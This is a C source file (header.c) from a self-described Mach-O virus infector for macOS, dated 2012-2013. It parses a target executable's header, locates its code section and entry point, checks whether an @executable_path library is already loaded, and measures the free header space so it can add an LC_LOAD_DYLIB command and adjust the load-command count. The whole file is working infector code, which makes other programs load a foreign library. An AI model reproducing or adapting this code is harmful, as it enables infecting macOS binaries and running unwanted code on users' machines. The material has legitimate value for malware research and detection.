/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * header.c
 *
 */

#include "header.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include "fileoperations.h"
#include "configuration.h"

static uint8_t can_inject_library_aux(target_info_t *targetInfo, const char* libName);

/*
 * retrieve header information from the target buffer, which should contain a valid mach-o binary
 */
int
retrieve_headerinfo(target_info_t *targetInfo)
{   
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    uint8_t *address = NULL;
    // this is not entirely true but we can get away with it
    struct mach_header *mh = (struct mach_header*)targetInfo->buffer;
    uint32_t nrLoadCmds            = mh->ncmds;
    targetInfo->nrLoadCmds     = mh->ncmds;
    targetInfo->sizeOfLoadCmds = mh->sizeofcmds;
    targetInfo->cputype        = mh->cputype;
    targetInfo->cpusubtype     = mh->cpusubtype;

    if (mh->magic == MH_MAGIC)
    {
        targetInfo->headerSize = sizeof(struct mach_header);
        targetInfo->is64Bits = 0;
    }
    else if (mh->magic == MH_MAGIC_64)
    {
        targetInfo->headerSize = sizeof(struct mach_header_64);
        targetInfo->is64Bits = 1;
    }
    // other archs or bad header...
    else
    {
#if DEBUG
        printf("[ERROR] Could not find a valid/supported Mach-O header!\n");
#endif
        return 1;
    }

    // first load cmd address
    address = targetInfo->buffer + targetInfo->headerSize;
    // find the last command offset
    struct load_command *loadCommand = NULL;

    for (uint32_t i = 0; i < nrLoadCmds; i++)
    {
        loadCommand = (struct load_command*)address;
        // 32bits segment commands
        if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                // address of the first section
                uint8_t *sectionAddress = address + sizeof(struct segment_command);
                struct section *sectionCommand = NULL; 
                // iterate thru all sections
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    sectionCommand = (struct section*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        targetInfo->textOffset  = sectionCommand->offset;
                        targetInfo->textAddress = sectionCommand->addr;
                        targetInfo->textSize    = sectionCommand->size;
                    }
                    sectionAddress += sizeof(struct section);
                }
            }
        }
        // 64bits segment commands
        else if (loadCommand->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *segmentCommand64 = (struct segment_command_64*)address;
            if (strncmp(segmentCommand64->segname, "__TEXT", 16) == 0)
            {
                // address of the first section
                uint8_t *sectionAddress = address + sizeof(struct segment_command_64);
                struct section_64 *sectionCommand64 = NULL; 
                // iterate thru all sections
                for (uint32_t x = 0; x < segmentCommand64->nsects; x++)
                {
                    sectionCommand64 = (struct section_64*)(sectionAddress);
                    if (strncmp(sectionCommand64->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        targetInfo->textOffset  = sectionCommand64->offset;
                        targetInfo->textAddress = sectionCommand64->addr;
                        targetInfo->textSize    = sectionCommand64->size;
                    }
                    sectionAddress += sizeof(struct section_64);
                }
            }
        }
        // all other commands we are interested in
        else if (loadCommand->cmd == LC_ENCRYPTION_INFO)
        {
            struct encryption_info_command *segmentCommand = (struct encryption_info_command*)address;
            targetInfo->cryptSectionOffset = segmentCommand->cryptoff;
        }
        else if (loadCommand->cmd == LC_UNIXTHREAD)
        {
            thread_command_t *threadCommand = (thread_command_t*)address;
            switch (threadCommand->flavor)
            {
                case x86_THREAD_STATE32:
                {
                    targetInfo->entrypoint = ((x86_thread_state32_t*)(address+sizeof(thread_command_t)))->__eip;
                    break;
                }
                case x86_THREAD_STATE64:
                    targetInfo->entrypoint = ((x86_thread_state64_t*)(address+sizeof(thread_command_t)))->__rip;
                    break;
            }
        }
        // the new command used by Mountain Lion binaries
        // XXX: test this
        else if (loadCommand->cmd == LC_MAIN)
        {
            struct entry_point_command *segmentCommand = (struct entry_point_command*)address;
            targetInfo->entrypoint = segmentCommand->entryoff;
        }
        // advance to next command, size field holds the total size of each command, including sections
        address += loadCommand->cmdsize;
    }
    return 0;
}

/*
 * verify if we aren't to try to inject/replace a duplicate
 */
uint8_t 
verify_library_exists(uint8_t *address, const uint32_t nrLoadCmds, const char *libraryToAdd)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // find the last command offset
    struct load_command *loadCommand = NULL;
    uint8_t *tempAddress = address;
    
    for (uint32_t i = 0; i < nrLoadCmds; i++)
    {
        loadCommand = (struct load_command*)tempAddress;
        // this code will match a fixed name for the virus library
//        if (loadCommand->cmd == LC_LOAD_DYLIB)
//        {
//            struct dylib_command *dylibCommand = (struct dylib_command*)tempAddress;
//            // we need to match the library to be replaced and extract some information
//            if (strcmp(libraryToAdd, (char*)(tempAddress + dylibCommand->dylib.name.offset)) == 0)
//            {
//                return(1);
//            }
//        }
        // advance to next command, size field holds the total size of each command, including sections
        tempAddress += loadCommand->cmdsize;
    }
    // we instead try to match if the last command is a library and if it has @executable_path in the library name
    // we need this additional match because not all binaries are code signed (usually the last command)
    tempAddress -= loadCommand->cmdsize;
    struct dylib_command *dylibCommand = (struct dylib_command*)(tempAddress);
    if (loadCommand->cmd == LC_LOAD_DYLIB &&
        strstr((char*)(tempAddress + dylibCommand->dylib.name.offset), "@executable_path") != NULL)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}

/*
 * fix the mach-o header to add the new command
 */
void 
addcmd_to_header(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    if (targetInfo->is64Bits)
    {
        struct mach_header_64 *tempHeader64 = (struct mach_header_64*)targetInfo->buffer;
        tempHeader64->ncmds += 1;
        tempHeader64->sizeofcmds += targetInfo->injectionSize;
    }
    else
    {
        struct mach_header *tempHeader = (struct mach_header*)targetInfo->buffer;
        tempHeader->ncmds += 1;
        tempHeader->sizeofcmds += targetInfo->injectionSize;
    }       
}

/*
 * verify if there is enough space to inject the library
 * the structure will hold pointer to the buffer with target contents
 */
uint8_t 
can_inject_library(const char* targetFullPath, const char* libName, target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
    printf("[DEBUG] Starting the header space verification of %s...\n", targetFullPath);
#endif
    uint8_t ret = 0;
    // read the header of the target
    targetInfo->fileSize = read_target(&(targetInfo->buffer), targetFullPath);
    if (targetInfo->fileSize == 0) return 1; // if returned size is 0, read failed!

    int32_t magic = *(uint32_t*)(targetInfo->buffer);
    
    if (magic == MH_MAGIC || magic == MH_MAGIC_64)
    {
        if(can_inject_library_aux(targetInfo, libName))
        {
            free(targetInfo->buffer); // failure so cleanup the buffer
            ret = 1;
        }
    }
    else // fat binaries not supported in this version, everything else also failure
    {
        free(targetInfo->buffer);
        ret = 1;
    }
    return ret;
}

/*
 * auxiliary function to support fat and non-fat binaries
 */
static uint8_t
can_inject_library_aux(target_info_t *targetInfo, const char* libName)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // retrieve the necessary information from the header
    if (retrieve_headerinfo(targetInfo)) return 1;

    // the offset position of the first data (usually code or crypt info)
    uint8_t *firstSectionOffset = 0;
    // XXX: taking a shortcut here!
    //      sometimes the crypt info data is first than __text
    //      the right way to do it would be to find the lowest data offset in the header
    if (targetInfo->cryptSectionOffset == 0 || targetInfo->cryptSectionOffset > targetInfo->textOffset)
        firstSectionOffset = targetInfo->buffer + targetInfo->textOffset;
    else
        firstSectionOffset = targetInfo->buffer + targetInfo->cryptSectionOffset;

    // verify is there is enough space available
    // calculate offset to where injection will be done, after the last load command
    uint8_t *injectionStartOffset = targetInfo->buffer + targetInfo->headerSize + targetInfo->sizeOfLoadCmds;
    // the size for the new command to be injected
    uint32_t injectionSize = sizeof(struct dylib_command) + (uint32_t)strlen(libName) + 1;
    // must be a multiple of uint32_t
    uint32_t remainder = injectionSize % sizeof(uint32_t);
    if (remainder != 0) injectionSize += sizeof(uint32_t) - remainder;
    // if there's not enough space to inject the new header return error
    if ( (firstSectionOffset - injectionStartOffset) < injectionSize )
    {
#if DEBUG
        fprintf(stderr, "[ERROR] Not enough space for injection!\n");
#endif
        return 1;
    }
#if DEBUG
    printf("[DEBUG] There are %ld free bytes at the header of !\n", (firstSectionOffset-injectionStartOffset));
#endif
    // set injection info
    targetInfo->injectionStartOffset = injectionStartOffset;
    targetInfo->injectionSize = injectionSize;
    return 0;
}

